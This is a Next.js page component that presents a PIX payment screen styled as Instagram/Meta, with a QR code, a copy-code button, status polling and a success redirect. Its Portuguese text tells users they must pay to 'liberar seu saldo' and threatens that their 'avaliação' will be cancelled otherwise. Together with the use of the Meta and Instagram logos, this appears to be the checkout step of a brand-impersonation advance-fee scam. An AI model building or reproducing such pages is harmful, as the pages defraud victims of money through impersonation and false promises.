"use client"

import { useState, useEffect } from "react"
import { Button } from "@/components/ui/button"
import Image from "next/image"
import { useSearchParams } from "next/navigation"
import { navigateWithUTM } from "@/lib/utm-manager"

export default function PixPaymentPage() {
  const searchParams = useSearchParams()
  const transactionId = searchParams.get("id")

  const [pixData, setPixData] = useState<{
    transactionId: string
    pixPayload: string
    amount: number
  } | null>(null)
  const [pixCopied, setPixCopied] = useState(false)
  const [paymentApproved, setPaymentApproved] = useState(false)
  const [isLoading, setIsLoading] = useState(true)

  useEffect(() => {
    // Get PIX data from localStorage
    const storedPixData = localStorage.getItem("pixData")
    if (storedPixData) {
      const data = JSON.parse(storedPixData)
      setPixData(data)
    }
    setIsLoading(false)
  }, [])

  useEffect(() => {
    if (transactionId) {
      checkPaymentStatus(transactionId)
    }
  }, [transactionId])

  const checkPaymentStatus = async (id: string) => {
    try {
      const interval = setInterval(async () => {
        const response = await fetch(`/api/check-payment-status?id=${id}`)
        const data = await response.json()

        if (data.status === "AUTHORIZED" || data.status === "PAID") {
          clearInterval(interval)
          setPaymentApproved(true)
          setTimeout(() => {
            navigateWithUTM("/success")
          }, 2000)
        }
      }, 5000)

      // Stop polling after 10 minutes
      setTimeout(() => clearInterval(interval), 10 * 60 * 1000)
    } catch (error) {
      console.error("Error checking payment status:", error)
    }
  }

  const copyPixCode = async () => {
    if (pixData?.pixPayload) {
      try {
        await navigator.clipboard.writeText(pixData.pixPayload)
        setPixCopied(true)
        setTimeout(() => setPixCopied(false), 2000)
      } catch (error) {
        console.error("Erro ao copiar código PIX:", error)
      }
    }
  }

  if (isLoading) {
    return (
      <div className="min-h-screen bg-gray-50 flex items-center justify-center">
        <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-pink-500"></div>
      </div>
    )
  }

  if (!pixData) {
    return (
      <div className="min-h-screen bg-gray-50 flex items-center justify-center p-4">
        <div className="text-center">
          <h1 className="text-xl font-bold text-gray-800 mb-2">Erro</h1>
          <p className="text-gray-600 mb-4">Dados do pagamento não encontrados</p>
          <Button onClick={() => navigateWithUTM("/")}>Voltar ao início</Button>
        </div>
      </div>
    )
  }

  return (
    <div className="min-h-screen bg-gray-50 flex flex-col">
      {/* Header */}
      <div className="bg-white px-4 py-3 flex items-center justify-between shadow-sm">
        <div className="flex items-center gap-2">
          <Image src="/images/meta-logo.png" alt="Meta" width={80} height={32} className="h-8 w-auto" />
        </div>
        <div className="text-white px-2 py-1.5 rounded-full font-bold shadow-lg text-sm bg-gradient-to-r from-pink-500 via-purple-500 to-orange-400 flex items-center gap-1">
          <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 20 20">
            <path
              fillRule="evenodd"
              d="M4 4a2 2 0 00-2 2v1h16V6a2 2 0 00-2-2H4zm14 3H2v5a2 2 0 002 2h12a2 2 0 002-2V7zM2.5 9a1.5 1.5 0 113 0 1.5 1.5 0 01-3 0z"
              clipRule="evenodd"
            />
          </svg>
          R$ 495.30
        </div>
      </div>

      {/* Main Content */}
      <div className="flex-1 flex flex-col items-center justify-center p-4 max-w-md mx-auto w-full">
        {paymentApproved ? (
          <div className="text-center space-y-4">
            <div className="w-20 h-20 bg-green-500 rounded-full flex items-center justify-center mx-auto">
              <svg className="w-10 h-10 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
              </svg>
            </div>
            <h1 className="text-2xl font-bold text-green-600">Pagamento Aprovado!</h1>
            <p className="text-gray-600">Redirecionando...</p>
          </div>
        ) : (
          <>
            {/* Instagram Icon */}
            <div className="w-20 h-20 mb-6 flex items-center justify-center">
              <Image
                src="/images/instagram-logo-official.png"
                alt="Instagram"
                width={80}
                height={80}
                className="w-20 h-20"
              />
            </div>

            {/* Title */}
            <h1 className="text-2xl font-bold text-gray-800 mb-2 text-center">PAGAMENTO PIX</h1>

            {/* Amount */}
            <div className="bg-gradient-to-r from-pink-500 to-orange-400 text-white px-6 py-3 rounded-2xl font-bold text-xl mb-6">
              R$ {pixData.amount.toFixed(2).replace(".", ",")}
            </div>

            {/* QR Code */}
            <div className="bg-white p-6 rounded-2xl shadow-lg mb-6 w-full max-w-sm">
              <div className="flex justify-center mb-4">
                <img
                  src={`https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(pixData.pixPayload)}`}
                  alt="QR Code PIX"
                  className="w-48 h-48"
                />
              </div>

              {/* PIX Code */}
              <div className="space-y-3">
                <p className="text-sm font-medium text-gray-700 text-center">Código PIX:</p>
                <div className="bg-gray-100 p-3 rounded-lg">
                  <p className="text-xs font-mono break-all text-gray-800">{pixData.pixPayload.substring(0, 50)}...</p>
                </div>

                <Button
                  onClick={copyPixCode}
                  className="w-full bg-gradient-to-r from-pink-500 to-orange-400 hover:from-pink-600 hover:to-orange-500 text-white font-bold py-3 rounded-xl"
                >
                  {pixCopied ? "Código Copiado!" : "Copiar Código PIX"}
                </Button>
              </div>
            </div>

            {/* Warning Messages */}
            <div className="space-y-3 w-full max-w-sm">
              <div className="bg-yellow-50 border border-yellow-200 rounded-lg p-3">
                <p className="text-xs text-yellow-800 font-medium text-center">
                  ⚠️ Atenção: Após realizar o pagamento via PIX, retorne ao site para liberar seu saldo.
                </p>
              </div>

              <div className="bg-red-50 border border-red-200 rounded-lg p-3">
                <p className="text-xs text-red-800 font-medium text-center">
                  Lembrando: Caso não efetue o pagamento, sua avaliação será anulada e cancelada.
                </p>
              </div>
            </div>

            {/* Payment Status */}
            <div className="text-center mt-6">
              <p className="text-sm text-gray-600 mb-2">Aguardando pagamento...</p>
              <div className="flex justify-center">
                <div className="animate-pulse flex space-x-1">
                  <div className="w-2 h-2 bg-pink-500 rounded-full"></div>
                  <div className="w-2 h-2 bg-pink-500 rounded-full"></div>
                  <div className="w-2 h-2 bg-pink-500 rounded-full"></div>
                </div>
              </div>
            </div>
          </>
        )}
      </div>

      {/* Footer */}
      <div className="text-center text-xs text-gray-500 p-4">
        Todos os direitos reservados © 2025 Instagram from Meta
      </div>
    </div>
  )
}
